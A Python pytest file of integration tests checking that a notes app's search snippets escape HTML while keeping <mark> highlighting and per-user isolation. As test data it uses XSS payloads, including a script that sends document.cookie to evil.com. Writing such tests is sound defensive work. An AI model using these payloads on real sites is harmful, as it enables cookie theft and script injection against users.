"""Integration tests for search sanitization end-to-end."""

from pathlib import Path

import pytest

from backend.src.services.database import DatabaseService
from backend.src.services.indexer import IndexerService


@pytest.fixture()
def indexer(tmp_path: Path) -> IndexerService:
    """Create a temporary IndexerService with initialized database."""
    db_path = tmp_path / "index.db"
    db_service = DatabaseService(db_path)
    db_service.initialize()
    return IndexerService(db_service=db_service)


def _note(path: str, title: str, body: str) -> dict:
    """Helper to create a note dictionary."""
    return {
        "path": path,
        "metadata": {"title": title},
        "body": body,
    }


@pytest.mark.integration
def test_search_sanitizes_script_tags(indexer: IndexerService) -> None:
    """Test that script tags in note content are escaped in search results."""
    # Create a note with malicious script tags
    indexer.index_note(
        "test-user",
        _note(
            "notes/malicious.md",
            "Security Test",
            "This note contains a script tag <script>alert('XSS')</script> and some searchable content.",
        ),
    )

    # Search for content that will match the note
    results = indexer.search_notes("test-user", "searchable")

    # Verify we got a result
    assert len(results) > 0
    result = results[0]
    assert result["path"] == "notes/malicious.md"

    # Verify the snippet is sanitized - script tags should be escaped
    snippet = result["snippet"]
    assert "<script>" not in snippet
    assert "&lt;script&gt;" in snippet
    assert "&lt;/script&gt;" in snippet

    # Verify <mark> tags are still present for highlighting
    assert "<mark>" in snippet
    assert "</mark>" in snippet


@pytest.mark.integration
def test_search_sanitizes_event_handlers(indexer: IndexerService) -> None:
    """Test that event handlers in note content are escaped in search results."""
    # Create a note with malicious event handlers
    indexer.index_note(
        "test-user",
        _note(
            "notes/events.md",
            "Event Handler Test",
            "Image with malicious onerror: <img onerror=alert(1) src=x> and some important data.",
        ),
    )

    # Search for content
    results = indexer.search_notes("test-user", "important")

    # Verify we got a result
    assert len(results) > 0
    result = results[0]
    assert result["path"] == "notes/events.md"

    # Verify the snippet is sanitized - HTML tags and handlers should be escaped
    snippet = result["snippet"]
    assert "<img" not in snippet or "&lt;img" in snippet
    assert "onerror=" in snippet  # The text remains but is not executable

    # Verify <mark> tags are still present
    assert "<mark>" in snippet
    assert "</mark>" in snippet


@pytest.mark.integration
def test_search_sanitizes_multiple_xss_vectors(indexer: IndexerService) -> None:
    """Test that multiple XSS attack vectors are all sanitized."""
    # Create a note with multiple XSS vectors
    indexer.index_note(
        "test-user",
        _note(
            "notes/xss-vectors.md",
            "XSS Vector Collection",
            """
            Various XSS attacks:
            1. <script>fetch('http://evil.com?cookie='+document.cookie)</script>
            2. <iframe src='javascript:alert(1)'></iframe>
            3. <svg onload=alert(1)>
            4. <a href='data:text/html,<script>alert(1)</script>'>Click</a>
            5. <div onclick='malicious()'>Click me</div>
            All of these should be sanitized in the search results.
            """,
        ),
    )

    # Search for content
    results = indexer.search_notes("test-user", "sanitized")

    # Verify we got a result
    assert len(results) > 0
    result = results[0]
    assert result["path"] == "notes/xss-vectors.md"

    # Verify all dangerous tags are escaped
    snippet = result["snippet"]
    assert "<script>" not in snippet
    assert "<iframe" not in snippet or "&lt;iframe" in snippet
    assert "<svg" not in snippet or "&lt;svg" in snippet

    # Verify <mark> tags work for the search term
    assert "<mark>" in snippet
    assert "</mark>" in snippet


@pytest.mark.integration
def test_search_preserves_mark_highlighting(indexer: IndexerService) -> None:
    """Test that FTS5 <mark> highlighting works correctly after sanitization."""
    # Create a note with normal content
    indexer.index_note(
        "test-user",
        _note(
            "notes/normal.md",
            "Normal Content",
            "This note has multiple occurrences of the search term. "
            "The search term should be highlighted properly. "
            "Multiple search term instances should all be marked.",
        ),
    )

    # Search for "search term"
    results = indexer.search_notes("test-user", "search term")

    # Verify we got a result
    assert len(results) > 0
    result = results[0]
    assert result["path"] == "notes/normal.md"

    # Verify the snippet has mark tags highlighting our search terms
    snippet = result["snippet"]
    assert "<mark>" in snippet
    assert "</mark>" in snippet

    # Count mark tags - should have multiple (at least 2 for "search" and "term")
    mark_count = snippet.count("<mark>")
    assert mark_count >= 2

    # Verify closing tags match opening tags
    assert snippet.count("<mark>") == snippet.count("</mark>")


@pytest.mark.integration
def test_search_with_html_in_content_and_highlighting(indexer: IndexerService) -> None:
    """Test sanitization when both HTML content and search highlighting are present."""
    # Create a note with HTML tags and searchable content
    indexer.index_note(
        "test-user",
        _note(
            "notes/mixed.md",
            "Mixed Content",
            "Example code: <div class='container'>Hello World</div> contains a greeting. "
            "The greeting should be highlighted in search results.",
        ),
    )

    # Search for "greeting"
    results = indexer.search_notes("test-user", "greeting")

    # Verify we got a result
    assert len(results) > 0
    result = results[0]
    assert result["path"] == "notes/mixed.md"

    # Verify the snippet is sanitized
    snippet = result["snippet"]

    # The <div> tag should be escaped
    assert "<div" not in snippet or "&lt;div" in snippet
    assert "&lt;div class=" in snippet
    assert "&lt;/div&gt;" in snippet

    # But the FTS5 <mark> tags should be preserved for highlighting "greeting"
    assert "<mark>greeting</mark>" in snippet or (
        "<mark>" in snippet and "</mark>" in snippet
    )

    # Make sure no executable HTML remains
    assert snippet.count("<div") == 0
    assert snippet.count("<script") == 0


@pytest.mark.integration
def test_search_sanitization_with_special_characters(indexer: IndexerService) -> None:
    """Test that special characters are properly escaped in snippets."""
    # Create a note with special characters
    indexer.index_note(
        "test-user",
        _note(
            "notes/special.md",
            "Special Characters",
            "Code example: if (x > 5 && y < 10) { return true; } is a comparison function.",
        ),
    )

    # Search for "comparison"
    results = indexer.search_notes("test-user", "comparison")

    # Verify we got a result
    assert len(results) > 0
    result = results[0]
    assert result["path"] == "notes/special.md"

    # Verify special characters are escaped
    snippet = result["snippet"]
    assert "&gt;" in snippet  # > should be escaped
    assert "&lt;" in snippet  # < should be escaped
    assert "&amp;&amp;" in snippet  # && should be escaped

    # But <mark> tags should still be present
    assert "<mark>" in snippet
    assert "</mark>" in snippet


@pytest.mark.integration
def test_search_empty_results_return_empty_list(indexer: IndexerService) -> None:
    """Test that searching non-existent content returns empty results."""
    # Create a note
    indexer.index_note(
        "test-user",
        _note(
            "notes/test.md",
            "Test Note",
            "This is some content for testing.",
        ),
    )

    # Search for something that doesn't exist
    results = indexer.search_notes("test-user", "nonexistent")

    # Should return empty list
    assert isinstance(results, list)
    assert len(results) == 0


@pytest.mark.integration
def test_search_sanitization_multi_user_isolation(indexer: IndexerService) -> None:
    """Test that search results are properly isolated by user."""
    # Create notes for different users
    indexer.index_note(
        "user1",
        _note(
            "notes/user1-note.md",
            "User 1 Note",
            "<script>alert('user1')</script> User 1 searchable content.",
        ),
    )

    indexer.index_note(
        "user2",
        _note(
            "notes/user2-note.md",
            "User 2 Note",
            "<script>alert('user2')</script> User 2 searchable content.",
        ),
    )

    # Search as user1
    results_user1 = indexer.search_notes("user1", "searchable")
    assert len(results_user1) == 1
    assert results_user1[0]["path"] == "notes/user1-note.md"
    assert "&lt;script&gt;" in results_user1[0]["snippet"]
    assert "<mark>" in results_user1[0]["snippet"]

    # Search as user2
    results_user2 = indexer.search_notes("user2", "searchable")
    assert len(results_user2) == 1
    assert results_user2[0]["path"] == "notes/user2-note.md"
    assert "&lt;script&gt;" in results_user2[0]["snippet"]
    assert "<mark>" in results_user2[0]["snippet"]
